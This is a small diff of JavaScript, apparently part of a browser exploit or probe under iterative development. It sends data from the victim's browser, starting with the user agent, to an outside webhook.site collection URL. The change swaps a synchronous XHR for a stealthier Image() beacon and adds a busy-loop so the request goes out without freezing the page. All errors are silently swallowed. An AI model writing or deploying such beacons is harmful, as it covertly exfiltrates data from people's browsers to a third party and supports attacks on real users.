@@ -6,7 +6,9 @@
 const SINK = 'https://webhook.site/9b9f3ae6-9ca5-4a70-8d42-d9a45b78db92';
 const MARKER = 1.2345678901234e-300;
 function beacon(t, v){
-  try { var x=new XMLHttpRequest(); x.open('GET', SINK+'?t='+encodeURIComponent(t)+'&v='+encodeURIComponent(String(v).slice(0,150)), false); x.send(); } catch(e){}
+  // async Image() (proven in v2: 7/7 beacons delivered) -- a SYNC XHR freezes the renderer
+  try { new Image().src = SINK+'?t='+encodeURIComponent(t)+'&v='+encodeURIComponent(String(v).slice(0,150)); } catch(e){}
+  try { var n=0; for (var q=0;q<3e6;q++) n++; } catch(e){}   // ~20ms of main-thread time so the net thread flushes
 }
 beacon('V5-start', navigator.userAgent.slice(0,80));
 try {
